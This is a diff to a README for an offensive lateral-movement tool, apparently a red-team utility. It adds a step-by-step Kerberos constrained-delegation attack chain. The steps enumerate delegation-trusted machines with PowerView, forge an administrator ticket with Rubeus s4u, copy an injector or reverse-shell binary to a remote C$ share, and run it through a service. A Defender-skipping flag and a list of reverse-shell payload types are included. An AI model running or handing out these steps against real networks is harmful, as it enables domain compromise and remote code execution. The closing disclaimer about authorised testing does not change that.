@@ -37,20 +37,65 @@ FilelessLateralMovement.exe appsrv01 SensorService "C:\Windows\Temp\payload.exe"
 FilelessLateralMovement.exe appsrv01 SensorService "C:\Windows\Temp\payload.exe" --skip-defender
 ```
 
-## 🔥 Example Attack Chain (Constrained Delegation)
+## 🔥 Example Attack Chain (Constrained Delegation Exploitation)
 
-1. Obtain a TGS using Rubeus:
+### 🕵️ Step 1: Identify vulnerable computers
+
+Look for machines/accounts with the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag using PowerView:
 ```
-Rubeus.exe s4u /user:attackersystem$ /rc4:<HASH> /impersonateuser:administrator /msdsspn:cifs/file05 /ptt
+Get-DomainComputer -TrustedToAuth
 ```
 
-2. Execute remote payload:
+Example output:
 ```
-FilelessLateralMovement.exe file05 SensorService "C:\Windows\Temp\payload.exe"
+CN=WEB01,OU=EvilServers,OU=EvilComputers,DC=evil,DC=com
+msds-allowedtodelegateto : {cifs/file01.evil.com, cifs/FILE01}
+serviceprincipalname : {WSMAN/web01, TERMSRV/WEB01, ...}
+useraccountcontrol : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
 ```
+
+---
+
+### 🎭 Step 2: Abuse constrained delegation with Rubeus
+
+```
+Rubeus.exe s4u /user:WEB01$ /rc4:<HASH> /impersonateuser:administrator /msdsspn:cifs/file01.evil.com /ptt
+```
+
+---
+
+### 💣 Step 3: Check access & upload payload
+
+Check that the ticket works:
+```
+ls \\file01\c$
+```
+
+Upload the reverse shell or injector binary:
+```
+copy C:\Temp\inject.exe \\file01\c$\Windows\Temp\
+```
+
+---
+
+### ⚔️ Step 4: Execute payload remotely
+
+Run the payload on the target:
+```
+FilelessLateralMovement.exe file01.evil.com SensorService "C:\Windows\Temp\inject.exe"
+```
+
+---
+
+## ✅ Summary of payload types
+
+- Reverse shells (e.g., msfvenom, nc64.exe, custom revshells)  
+- Process injection binaries you developed  
+- LOLBins (e.g., `cmd.exe /c whoami`)
+
+---
 
 ## ⚠️ Disclaimer
 
 This tool is intended **for educational and authorized security testing purposes only**. Do not use it against systems you do not have explicit permission to test.
-
 
